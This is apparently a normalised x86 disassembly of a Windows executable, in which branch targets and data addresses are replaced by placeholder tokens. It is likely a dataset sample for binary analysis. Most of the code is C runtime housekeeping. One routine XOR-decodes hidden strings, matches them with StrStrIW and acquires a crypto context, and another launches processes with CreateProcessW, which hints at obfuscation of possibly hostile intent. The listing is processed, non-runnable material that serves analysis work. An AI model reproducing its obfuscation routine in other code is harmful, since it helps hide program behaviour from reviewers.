mov [ ebx ] 0x11c
call [ GetVersionExW@IAT ]
call [ GetProcessHeap@IAT ]
push 0x104
mov [ esi ] eax
lea eax [ esi + 0x73c ]
push edi
push eax
call sub_413e10
push 0x104
lea ecx [ esi + 0x944 ]
push edi
push ecx
call sub_413e10
push 0x104
lea edx [ esi + 0xb4c ]
push edi
push edx
call sub_413e10
xor eax eax
mov [ esi + 0xd5c ] eax
mov [ esi + 0xd60 ] eax
mov [ esi + 0xd64 ] eax
mov [ esi + 0xd68 ] eax
mov [ esi + 0xd7c ] eax
mov [ esi + 0xd80 ] eax
mov [ esi + 0xd84 ] eax
mov [ esi + 0xd88 ] eax
push 0x104
mov [ esi + 0xd8c ] ax
lea eax [ esi + 0x534 ]
push edi
push eax
call sub_413e10
push 0x104
lea ecx [ esi + 0x124 ]
push edi
push ecx
call sub_413e10
push 0x104
lea edx [ esi + 0x32c ]
push edi
push edx
call sub_413e10
mov ecx [ ebp - 0x4 ]
add esp 0x48
mov [ esi + 0xd54 ] edi
mov [ esi + 0xd58 ] edi
pop edi
xor ecx ebp
mov eax esi
pop ebx
call sub_401400
mov esp ebp
pop ebp
retn
sub_4066cf
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
jmp r-xdata
push [ ebp + 0x8 ]
call sub_40381b
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call sub_411115
pop ecx
test eax eax
je r-xdata
leave
retn
test [ rw-data ] 0x1
mov edi rw-data
mov esi r--data
jne r-xdata
push edi
lea ecx [ ebp - 0x10 ]
call sub_409fc3
push r--data
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] esi
call sub_4037cf
int3
or [ rw-data ] 0x1
push 0x1
lea eax [ ebp - 0x4 ]
push eax
mov ecx edi
mov [ ebp - 0x4 ] r--data
call sub_410010
push sub_4165ec
mov [ rw-data ] esi
call sub_40cafa
pop ecx
sub_40674f
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_407759
push [ ebp + 0x28 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_415785
add esp 0x24
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_4067a0
push ebp
mov ebp esp
push esi
mov esi eax
push edi
mov edi ecx
test esi esi
je r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx 0x7ffffffe
jbe r-xdata
mov ecx [ edi + 0x14 ]
cmp ecx 0x8
jb r-xdata
mov eax [ edi + 0x14 ]
cmp eax ebx
jae r-xdata
push r--data
call sub_40458d
mov eax edi
mov eax [ edi ]
jmp r-xdata
test ebx ebx
jne r-xdata
mov ecx [ edi + 0x10 ]
push ecx
push ebx
push edi
call sub_40f940
test ebx ebx
je r-xdata
cmp ecx 0x8
jb r-xdata
cmp esi eax
jb r-xdata
cmp [ edi + 0x14 ] 0x8
jb r-xdata
mov [ edi + 0x10 ] ebx
cmp eax 0x8
jb r-xdata
pop ebx
mov eax edi
pop edi
pop esi
pop ebp
retn 0x4
mov eax edi
mov eax [ edi ]
jmp r-xdata
mov eax edi
mov eax [ edi ]
jmp r-xdata
pop ebx
mov eax edi
xor edx edx
pop edi
mov [ eax ] dx
pop esi
pop ebp
retn 0x4
mov eax [ edi ]
xor edx edx
pop ebx
mov [ eax ] dx
mov eax edi
pop edi
pop esi
pop ebp
retn 0x4
cmp ecx 0x8
jb r-xdata
mov edx [ edi + 0x10 ]
lea eax [ eax + edx * 2 ]
cmp eax esi
jbe r-xdata
mov eax edi
xor ecx ecx
mov [ ebx + eax ] cx
mov eax [ edi ]
xor ecx ecx
mov [ ebx + eax ] cx
pop ebx
mov eax edi
pop edi
pop esi
pop ebp
retn 0x4
add ebx ebx
push ebx
push esi
push eax
call sub_415340
mov eax [ ebp + 0x8 ]
add esp 0xc
cmp [ edi + 0x14 ] 0x8
mov [ edi + 0x10 ] eax
jb r-xdata
mov eax edi
sub esi eax
mov eax [ ebp + 0x8 ]
sar esi 0x1
push esi
push edi
call sub_40a580
pop edi
pop esi
pop ebp
retn 0x4
mov eax [ edi ]
sub esi eax
mov eax [ ebp + 0x8 ]
sar esi 0x1
push esi
push edi
call sub_40a580
pop edi
pop esi
pop ebp
retn 0x4
sub_4068a2
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push edi
mov edi ecx
je r-xdata
pop edi
pop ebp
retn 0x4
push esi
push [ ebp + 0x8 ]
call sub_413e90
lea esi [ eax + 0x1 ]
push esi
call sub_40381b
pop ecx
pop ecx
mov [ edi + 0x4 ] eax
test eax eax
je r-xdata
pop esi
push [ ebp + 0x8 ]
push esi
push eax
call sub_40ca53
add esp 0xc
mov [ edi + 0x8 ] 0x1
sub_406909
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
js r-xdata
call sub_40f84f
mov [ eax ] 0x16
call sub_40c515
or eax 0xffffffff
pop ebp
retn
cmp ecx 0x2
jle r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ecx
pop ebp
retn
cmp ecx 0x3
jne r-xdata
mov eax [ rw-data ]
pop ebp
retn
sub_406948
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
push ebx
push edi
mov edi 0xbb40e64e
mov ebx 0xffff0000
cmp eax edi
je r-xdata
push esi
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov esi [ ebp - 0x4 ]
xor esi [ ebp - 0x8 ]
call [ GetCurrentProcessId@IAT ]
xor esi eax
call [ GetCurrentThreadId@IAT ]
xor esi eax
call [ GetTickCount@IAT ]
xor esi eax
lea eax [ ebp - 0x10 ]
push eax
call [ QueryPerformanceCounter@IAT ]
mov eax [ ebp - 0xc ]
xor eax [ ebp - 0x10 ]
xor esi eax
cmp esi edi
jne r-xdata
test ebx eax
je r-xdata
test ebx esi
jne r-xdata
mov esi 0xbb40e64f
jmp r-xdata
not eax
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] esi
not esi
mov [ rw-data ] esi
pop esi
mov eax esi
or eax 0x4711
shl eax 0x10
or esi eax
pop edi
pop ebx
leave
retn
sub_4069f0
push ebp
mov ebp esp
sub esp 0x70
mov eax [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
push edi
mov [ ebp - 0x8 ] ebx
cmp [ eax + 0x8 ] ebx
jbe r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov edi [ CloseHandle@IAT ]
mov ecx [ ebp + 0x8 ]
inc [ ebp - 0x8 ]
cmp ebx [ ecx + 0x8 ]
jb r-xdata
push 0x44
lea ecx [ ebp - 0x6c ]
push 0x0
push ecx
call sub_413e10
add esp 0xc
xor eax eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] eax
lea edx [ ebp - 0x24 ]
push edx
lea eax [ ebp - 0x6c ]
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov [ ebp - 0x6c ] 0x44
mov ecx [ esi + 0x10 ]
push 0x0
push ecx
call [ CreateProcessW@IAT ]
mov edx [ ebp - 0x20 ]
push edx
call edi
mov eax [ ebp - 0x24 ]
push eax
call edi
inc ebx
cmp [ esi + 0x15 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x8 ]
lea edx [ ebp - 0xc ]
push edx
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0xc ] ecx
call sub_401a90
mov esi [ ebp - 0x14 ]
cmp esi [ ebp - 0x10 ]
je r-xdata
cmp esi [ ebp - 0x10 ]
jne r-xdata
mov eax [ esi + 0x8 ]
cmp [ eax + 0x15 ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
cmp [ eax + 0x15 ] 0x0
jne r-xdata
mov esi eax
mov eax [ esi ]
cmp [ eax + 0x15 ] 0x0
jne r-xdata
mov esi eax
cmp esi [ eax + 0x8 ]
jne r-xdata
lea ecx [ ecx ]
mov esi eax
mov eax [ eax + 0x4 ]
cmp [ eax + 0x15 ] 0x0
je r-xdata
mov esi eax
mov eax [ esi ]
cmp [ eax + 0x15 ] 0x0
je r-xdata
jmp r-xdata
sub_406af0
push ebp
mov ebp esp
mov edx [ eax + 0x8 ]
push ebx
push esi
push edi
cmp edx 0x71c71c6
jb r-xdata
mov edi [ ebp + 0x10 ]
inc edx
mov [ eax + 0x8 ] edx
mov [ edi + 0x4 ] ecx
mov edx [ eax + 0x4 ]
xor ebx ebx
cmp ecx edx
jne r-xdata
mov esi [ ebp + 0x10 ]
cmp [ esi + 0x20 ] 0x10
jb r-xdata
cmp [ ebp + 0xc ] bl
je r-xdata
mov [ edx + 0x4 ] edi
mov ecx [ eax + 0x4 ]
mov [ ecx ] edi
mov edx [ eax + 0x4 ]
jmp r-xdata
xor ebx ebx
mov [ esi + 0x20 ] 0xf
mov [ esi + 0x1c ] ebx
push esi
mov [ esi + 0xc ] bl
call sub_408b16
add esp 0x4
push r--data
call sub_40458d
mov eax [ esi + 0xc ]
push eax
call sub_408b16
add esp 0x4
mov [ ecx + 0x8 ] edi
mov edx [ eax + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
mov [ ecx ] edi
mov edx [ eax + 0x4 ]
cmp ecx [ edx ]
jne r-xdata
mov [ edx + 0x8 ] edi
mov edx [ edi + 0x4 ]
mov ecx edi
cmp [ edx + 0x30 ] bl
jne r-xdata
mov [ edx ] edi
jmp r-xdata
mov eax [ eax + 0x4 ]
mov ecx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] edi
pop edi
pop esi
mov [ ecx + 0x30 ] 0x1
pop ebx
pop ebp
retn 0xc
mov edx [ ecx + 0x4 ]
mov esi [ edx + 0x4 ]
cmp edx [ esi ]
jne r-xdata
mov esi [ esi ]
cmp [ esi + 0x30 ] bl
jne r-xdata
mov esi [ esi + 0x8 ]
cmp [ esi + 0x30 ] bl
jne r-xdata
cmp ecx [ edx ]
jne r-xdata
mov [ edx + 0x30 ] 0x1
mov [ esi + 0x30 ] 0x1
mov edx [ ecx + 0x4 ]
mov edx [ edx + 0x4 ]
mov [ edx + 0x30 ] bl
mov ecx [ ecx + 0x4 ]
mov ecx [ ecx + 0x4 ]
jmp r-xdata
cmp ecx [ edx + 0x8 ]
jne r-xdata
mov [ edx + 0x30 ] 0x1
mov [ esi + 0x30 ] 0x1
mov edx [ ecx + 0x4 ]
mov edx [ edx + 0x4 ]
mov [ edx + 0x30 ] bl
mov ecx [ ecx + 0x4 ]
mov ecx [ ecx + 0x4 ]
jmp r-xdata
mov edx [ ecx + 0x4 ]
mov [ edx + 0x30 ] 0x1
mov edx [ ecx + 0x4 ]
mov edx [ edx + 0x4 ]
mov [ edx + 0x30 ] bl
mov edx [ ecx + 0x4 ]
mov edx [ edx + 0x4 ]
mov esi [ edx + 0x8 ]
mov edi [ esi ]
mov [ edx + 0x8 ] edi
mov edi [ esi ]
cmp [ edi + 0x31 ] bl
jne r-xdata
mov ecx edx
mov edx [ ecx ]
mov esi [ edx + 0x8 ]
mov [ ecx ] esi
mov esi [ edx + 0x8 ]
cmp [ esi + 0x31 ] bl
jne r-xdata
mov edx [ ecx + 0x4 ]
cmp [ edx + 0x30 ] bl
je r-xdata
mov edx [ ecx + 0x4 ]
mov [ edx + 0x30 ] 0x1
mov edx [ ecx + 0x4 ]
mov edx [ edx + 0x4 ]
mov [ edx + 0x30 ] bl
mov edx [ ecx + 0x4 ]
mov edx [ edx + 0x4 ]
mov esi [ edx ]
mov edi [ esi + 0x8 ]
mov [ edx ] edi
mov edi [ esi + 0x8 ]
cmp [ edi + 0x31 ] bl
jne r-xdata
mov ecx edx
mov edx [ ecx + 0x8 ]
mov esi [ edx ]
mov [ ecx + 0x8 ] esi
mov esi [ edx ]
cmp [ esi + 0x31 ] bl
jne r-xdata
mov edi [ edx + 0x4 ]
mov [ esi + 0x4 ] edi
mov edi [ eax + 0x4 ]
cmp edx [ edi + 0x4 ]
jne r-xdata
mov [ edi + 0x4 ] edx
mov esi [ ecx + 0x4 ]
mov [ edx + 0x4 ] esi
mov esi [ eax + 0x4 ]
cmp ecx [ esi + 0x4 ]
jne r-xdata
mov [ esi + 0x4 ] ecx
mov edi [ edx + 0x4 ]
mov [ esi + 0x4 ] edi
mov edi [ eax + 0x4 ]
cmp edx [ edi + 0x4 ]
jne r-xdata
mov [ edi + 0x4 ] edx
mov esi [ ecx + 0x4 ]
mov [ edx + 0x4 ] esi
mov esi [ eax + 0x4 ]
cmp ecx [ esi + 0x4 ]
jne r-xdata
mov [ esi + 0x4 ] ecx
mov edi [ edx + 0x4 ]
cmp edx [ edi ]
jne r-xdata
mov [ edi + 0x4 ] esi
jmp r-xdata
mov esi [ ecx + 0x4 ]
cmp ecx [ esi + 0x8 ]
jne r-xdata
mov [ esi + 0x4 ] edx
jmp r-xdata
mov edi [ edx + 0x4 ]
cmp edx [ edi + 0x8 ]
jne r-xdata
mov [ edi + 0x4 ] esi
mov [ esi + 0x8 ] edx
jmp r-xdata
mov esi [ ecx + 0x4 ]
cmp ecx [ esi ]
jne r-xdata
mov [ esi + 0x4 ] edx
jmp r-xdata
mov [ edi + 0x8 ] esi
mov [ edi ] esi
jmp r-xdata
mov [ esi ] edx
mov [ esi ] edx
mov [ esi + 0x8 ] edx
jmp r-xdata
mov [ edx + 0x8 ] ecx
mov [ ecx + 0x4 ] edx
mov [ edi ] esi
mov [ esi + 0x8 ] edx
jmp r-xdata
mov [ edi + 0x8 ] esi
mov [ esi + 0x8 ] edx
jmp r-xdata
mov edi [ ebp + 0x10 ]
mov [ edx + 0x4 ] esi
mov [ esi + 0x8 ] edx
mov [ esi ] edx
jmp r-xdata
mov [ edx ] ecx
mov [ ecx + 0x4 ] edx
sub_406d3e
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
push [ esi + 0x4 ]
call sub_40ab76
push [ esi + 0x8 ]
call sub_40ab76
push [ esi + 0xc ]
call sub_40ab76
push [ esi + 0x10 ]
call sub_40ab76
push [ esi + 0x14 ]
call sub_40ab76
push [ esi + 0x18 ]
call sub_40ab76
push [ esi ]
call sub_40ab76
push [ esi + 0x20 ]
call sub_40ab76
push [ esi + 0x24 ]
call sub_40ab76
push [ esi + 0x28 ]
call sub_40ab76
push [ esi + 0x2c ]
call sub_40ab76
push [ esi + 0x30 ]
call sub_40ab76
push [ esi + 0x34 ]
call sub_40ab76
push [ esi + 0x1c ]
call sub_40ab76
push [ esi + 0x38 ]
call sub_40ab76
push [ esi + 0x3c ]
call sub_40ab76
add esp 0x40
push [ esi + 0x40 ]
call sub_40ab76
push [ esi + 0x44 ]
call sub_40ab76
push [ esi + 0x48 ]
call sub_40ab76
push [ esi + 0x4c ]
call sub_40ab76
push [ esi + 0x50 ]
call sub_40ab76
push [ esi + 0x54 ]
call sub_40ab76
push [ esi + 0x58 ]
call sub_40ab76
push [ esi + 0x5c ]
call sub_40ab76
push [ esi + 0x60 ]
call sub_40ab76
push [ esi + 0x64 ]
call sub_40ab76
push [ esi + 0x68 ]
call sub_40ab76
push [ esi + 0x6c ]
call sub_40ab76
push [ esi + 0x70 ]
call sub_40ab76
push [ esi + 0x74 ]
call sub_40ab76
push [ esi + 0x78 ]
call sub_40ab76
push [ esi + 0x7c ]
call sub_40ab76
add esp 0x40
push [ esi + 0x80 ]
call sub_40ab76
push [ esi + 0x84 ]
call sub_40ab76
push [ esi + 0x88 ]
call sub_40ab76
push [ esi + 0x8c ]
call sub_40ab76
push [ esi + 0x90 ]
call sub_40ab76
push [ esi + 0x94 ]
call sub_40ab76
push [ esi + 0x98 ]
call sub_40ab76
push [ esi + 0x9c ]
call sub_40ab76
push [ esi + 0xa0 ]
call sub_40ab76
push [ esi + 0xa4 ]
call sub_40ab76
push [ esi + 0xa8 ]
call sub_40ab76
push [ esi + 0xbc ]
call sub_40ab76
push [ esi + 0xc0 ]
call sub_40ab76
push [ esi + 0xc4 ]
call sub_40ab76
push [ esi + 0xc8 ]
call sub_40ab76
push [ esi + 0xcc ]
call sub_40ab76
add esp 0x40
push [ esi + 0xd0 ]
call sub_40ab76
push [ esi + 0xb8 ]
call sub_40ab76
push [ esi + 0xd8 ]
call sub_40ab76
push [ esi + 0xdc ]
call sub_40ab76
push [ esi + 0xe0 ]
call sub_40ab76
push [ esi + 0xe4 ]
call sub_40ab76
push [ esi + 0xe8 ]
call sub_40ab76
push [ esi + 0xec ]
call sub_40ab76
push [ esi + 0xd4 ]
call sub_40ab76
push [ esi + 0xf0 ]
call sub_40ab76
push [ esi + 0xf4 ]
call sub_40ab76
push [ esi + 0xf8 ]
call sub_40ab76
push [ esi + 0xfc ]
call sub_40ab76
push [ esi + 0x100 ]
call sub_40ab76
push [ esi + 0x104 ]
call sub_40ab76
push [ esi + 0x108 ]
call sub_40ab76
add esp 0x40
push [ esi + 0x10c ]
call sub_40ab76
push [ esi + 0x110 ]
call sub_40ab76
push [ esi + 0x114 ]
call sub_40ab76
push [ esi + 0x118 ]
call sub_40ab76
push [ esi + 0x11c ]
call sub_40ab76
push [ esi + 0x120 ]
call sub_40ab76
push [ esi + 0x124 ]
call sub_40ab76
push [ esi + 0x128 ]
call sub_40ab76
push [ esi + 0x12c ]
call sub_40ab76
push [ esi + 0x130 ]
call sub_40ab76
push [ esi + 0x134 ]
call sub_40ab76
push [ esi + 0x138 ]
call sub_40ab76
push [ esi + 0x13c ]
call sub_40ab76
push [ esi + 0x140 ]
call sub_40ab76
push [ esi + 0x144 ]
call sub_40ab76
push [ esi + 0x148 ]
call sub_40ab76
add esp 0x40
push [ esi + 0x14c ]
call sub_40ab76
push [ esi + 0x150 ]
call sub_40ab76
push [ esi + 0x154 ]
call sub_40ab76
push [ esi + 0x158 ]
call sub_40ab76
push [ esi + 0x15c ]
call sub_40ab76
push [ esi + 0x160 ]
call sub_40ab76
add esp 0x18
sub_4070c0
push ebp
mov ebp esp
push 0xffffffff
push sub_41603b
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn
push 0xc
call sub_4066cf
add esp 0x4
test eax eax
je r-xdata
xor eax eax
mov [ eax + 0x4 ] 0x0
mov [ eax + 0x8 ] 0x1
mov [ eax ] 0x0
jmp r-xdata
push 0x8007000e
call sub_40b3f0
mov [ ebp - 0x4 ] 0xffffffff
mov [ esi ] eax
test eax eax
jne r-xdata
sub_407150
push ebp
mov ebp esp
xor eax eax
test ecx ecx
je r-xdata
mov eax 0x80070057
cmp ecx 0x7fffffff
jbe r-xdata
pop ebp
retn
push esi
push edi
lea esi [ ecx - 0x1 ]
mov ecx [ ebp + 0x8 ]
lea eax [ ebp + 0xc ]
push eax
push ecx
push esi
push ebx
xor edi edi
call sub_40783e
add esp 0x10
test eax eax
js r-xdata
test eax eax
js r-xdata
xor eax eax
mov [ ebx + esi * 2 ] ax
mov edi 0x8007007a
cmp eax esi
ja r-xdata
jne r-xdata
mov eax edi
pop edi
pop esi
xor edx edx
mov eax edi
pop edi
mov [ ebx + esi * 2 ] dx
pop esi
pop ebp
retn
sub_4071aa
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40ab76
pop ecx
mov eax [ esi + 0x8 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40ab76
pop ecx
mov eax [ esi + 0x30 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40ab76
pop ecx
mov esi [ esi + 0x34 ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_40ab76
pop ecx
push esi
call sub_40ab76
pop ecx
sub_407213
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] eax
call sub_40c968
mov eax [ eax + 0x98 ]
mov [ esi + 0x4 ] eax
call sub_40c968
mov [ eax + 0x98 ] esi
mov eax esi
pop esi
pop ebp
retn
sub_40723f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
lea esi [ eax * 8 + rw-data ]
cmp [ esi ] 0x0
jne r-xdata
push [ esi ]
call [ EnterCriticalSection@IAT ]
pop esi
pop ebp
retn
push eax
call sub_4088c8
pop ecx
test eax eax
jne r-xdata
push 0x11
call sub_4103d9
sub_407290
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
or edi 0xffffffff
test esi esi
jne r-xdata
test [ esi + 0xc ] 0x83
je r-xdata
call sub_40f84f
mov [ eax ] 0x16
call sub_40c515
or eax edi
jmp r-xdata
and [ esi + 0xc ] 0x0
mov eax edi
push esi
call sub_40438b
push esi
mov edi eax
call sub_40f240
push esi
call sub_402116
push eax
call sub_413289
add esp 0x10
test eax eax
jns r-xdata
pop edi
pop esi
pop ebp
retn
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
or edi 0xffffffff
jmp r-xdata
push eax
call sub_40ab76
and [ esi + 0x1c ] 0x0
pop ecx
sub_407300
push ebp
mov ebp esp
sub esp 0x1d8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push edi
mov edi [ rw-data ]
push 0x11c
lea eax [ ebp - 0x1d0 ]
push 0x0
push eax
mov [ ebp - 0x1d4 ] edi
call sub_413e10
add esp 0xc
lea ecx [ ebp - 0x1d0 ]
push ecx
mov [ ebp - 0x1d0 ] 0x11c
call [ GetVersionExW@IAT ]
test eax eax
jne r-xdata
cmp [ ebp - 0x1cc ] 0x5
push ebx
mov ebx [ StrStrIW@IAT ]
push esi
jne r-xdata
mov eax 0x1
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_401400
mov esp ebp
pop ebp
retn
mov ecx [ r--data ]
xor eax eax
mov edi edi
cmp [ ebp - 0x1c8 ] 0x1
jne r-xdata
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0xffe3
and edx 0xff
mov [ ebp + eax * 2 - 0xc ] dx
inc eax
cmp eax 0x3
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x6 ] ax
lea esp [ esp ]
lea edx [ ebp - 0x64 ]
mov eax 0xa
call sub_404a80
mov esi [ edi + 0xda0 ]
cmp esi [ edi + 0xda4 ]
je r-xdata
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0xff91
and edx 0xff
mov [ ebp + eax * 2 - 0x38 ] dx
inc eax
cmp eax 0x6
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x2c ] ax
lea esp [ esp ]
mov ecx [ r--data ]
xor eax eax
cmp [ esi + 0x14 ] 0x8
jb r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x73
and edx 0xff
mov [ ebp + eax * 2 - 0xb4 ] dx
inc eax
cmp eax 0x11
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x92 ] ax
lea esp [ esp ]
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0x44
and edx 0xff
mov [ ebp + eax * 2 - 0x48 ] dx
inc eax
cmp eax 0x6
jb r-xdata
mov esi [ edi + 0xda0 ]
xor eax eax
mov [ ebp - 0x3c ] ax
cmp esi [ edi + 0xda4 ]
je r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xfffa
and edx 0xff
mov [ ebp + eax * 2 - 0x28 ] dx
inc eax
cmp eax 0x6
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x1c ] ax
lea esp [ esp ]
mov ecx [ r--data ]
xor eax eax
mov edi edi
mov edi edi
pop esi
pop ebx
mov eax 0x1
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_401400
mov esp ebp
pop ebp
retn
add esi 0x1c
cmp esi [ edi + 0xda4 ]
jne r-xdata
lea edx [ ebp - 0x64 ]
push edx
push eax
call ebx
test eax eax
jne r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x4b
and edx 0xff
mov [ ebp + eax * 2 - 0x90 ] dx
inc eax
cmp eax 0xb
jb r-xdata
mov esi [ edi + 0xda0 ]
xor eax eax
mov [ ebp - 0x7a ] ax
cmp esi [ edi + 0xda4 ]
je r-xdata
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0x6e
and edx 0xff
mov [ ebp + eax * 2 - 0x18 ] dx
inc eax
cmp eax 0x5
jb r-xdata
mov esi [ edi + 0xda0 ]
xor eax eax
mov [ ebp - 0xe ] ax
cmp esi [ edi + 0xda4 ]
je r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov esi [ edi + 0xda0 ]
cmp esi [ edi + 0xda4 ]
je r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov edi edi
add esi 0x1c
cmp esi [ edi + 0xda4 ]
jne r-xdata
lea ecx [ ebp - 0x48 ]
push ecx
push eax
call ebx
test eax eax
jne r-xdata
mov ecx [ r--data ]
xor eax eax
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x67
and edx 0xff
mov [ ebp + eax * 2 - 0x78 ] dx
inc eax
cmp eax 0x9
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x66 ] ax
lea ecx [ ecx ]
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
lea ecx [ ebp - 0xc ]
push ecx
push eax
call ebx
test eax eax
jne r-xdata
add esi 0x1c
cmp esi [ edi + 0xda4 ]
jne r-xdata
lea ecx [ ebp - 0x18 ]
push ecx
push eax
call ebx
test eax eax
jne r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffe6
and edx 0xff
mov [ ebp + eax * 2 - 0x58 ] dx
inc eax
cmp eax 0x7
jb r-xdata
mov esi [ edi + 0xda0 ]
xor eax eax
mov [ ebp - 0x4a ] ax
cmp esi [ edi + 0xda4 ]
je r-xdata
add esi 0x1c
cmp esi [ edi + 0xda4 ]
jne r-xdata
call sub_40a940
test eax eax
jne r-xdata
lea ecx [ ebp - 0x38 ]
push ecx
push eax
call ebx
test eax eax
je r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov ecx [ ebp - 0x4 ]
pop esi
pop ebx
xor ecx ebp
xor eax eax
pop edi
call sub_401400
mov esp ebp
pop ebp
retn
mov edi [ CryptAcquireContextW@IAT ]
mov ebx [ GetLastError@IAT ]
cmp [ esi + 0x14 ] 0x8
jb r-xdata
lea edx [ ebp - 0xb4 ]
push edx
push eax
call ebx
test eax eax
jne r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov edx [ ebp - 0x1d4 ]
add esi 0x1c
cmp esi [ edx + 0xda4 ]
jne r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
lea ecx [ ebp - 0x78 ]
push ecx
push eax
call [ StrStrIW@IAT ]
test eax eax
je r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
lea ecx [ ebp - 0x28 ]
push ecx
push eax
call ebx
test eax eax
jne r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
push 0x0
push 0x1
push r--data
push 0x0
lea eax [ ebp - 0x1d8 ]
push eax
call edi
test eax eax
jne r-xdata
lea edx [ ebp - 0x58 ]
push edx
push eax
call [ StrStrIW@IAT ]
test eax eax
je r-xdata
add esi 0x1c
cmp esi [ edi + 0xda4 ]
jne r-xdata
lea edx [ ebp - 0x90 ]
push edx
push eax
call ebx
test eax eax
jne r-xdata
mov ecx [ ebp - 0x1d8 ]
push 0x0
push ecx
call [ CryptReleaseContext@IAT ]
call ebx
cmp eax 0x80090016
jne r-xdata
sub_407759
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi + 0xc ] 0x0
test eax eax
jne r-xdata
mov ecx [ eax ]
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
call sub_40c968
mov [ esi + 0x8 ] eax
mov ecx [ eax + 0x6c ]
mov [ esi ] ecx
mov ecx [ eax + 0x68 ]
mov [ esi + 0x4 ] ecx
mov ecx [ esi ]
cmp ecx [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
mov ecx [ rw-data ]
